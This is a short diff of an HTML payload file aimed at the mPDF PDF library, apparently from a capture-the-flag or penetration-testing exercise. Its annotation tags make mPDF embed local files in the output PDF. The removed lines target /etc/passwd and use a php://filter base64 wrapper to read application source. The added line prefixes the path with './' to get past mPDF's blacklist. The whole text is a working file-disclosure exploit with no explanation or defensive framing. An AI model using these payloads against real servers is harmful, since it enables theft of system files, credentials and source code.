@@ -2,14 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Payload - Target Locked</title>
+    <title>Payload - Bypass mPDF Blacklist</title>
 </head>
 <body>
-    <h1>Testing Exact Paths</h1>
+    <h1>Testing Blacklist Bypass</h1>
     
-    <annotation file="/etc/passwd" content="Passwd" icon="Graph" title="Passwd_Test"></annotation>
-    
-    <annotation file="php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" content="Source" icon="Graph" title="Source_Test"></annotation>
+    <annotation file="./php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" content="Source" icon="Graph" title="Source_PHP"></annotation>
     
 </body>
 </html>
